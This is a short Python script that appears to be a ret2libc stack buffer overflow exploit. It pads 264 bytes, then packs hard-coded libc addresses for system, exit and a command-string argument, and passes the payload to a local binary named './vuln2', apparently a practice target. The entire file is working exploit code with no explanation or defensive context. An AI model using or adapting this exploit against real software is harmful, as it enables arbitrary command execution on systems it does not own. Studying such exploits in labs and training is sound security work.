#!/usr/bin/env python
import struct
import subprocess

libc = 0xb7c00000
addr_system = libc + 0x4c800 + 11
addr_exit =   libc + 0x3bc90
addr_arg =    libc + 0x1b5faa

# JUNK + SYSTEM + EXIT + SYSTEM_ARG
buf = "A" * 264
buf += struct.pack("<I",addr_system)
buf += struct.pack("<I",addr_exit)
buf += struct.pack("<I",addr_arg)

subprocess.call(["./vuln2", buf])
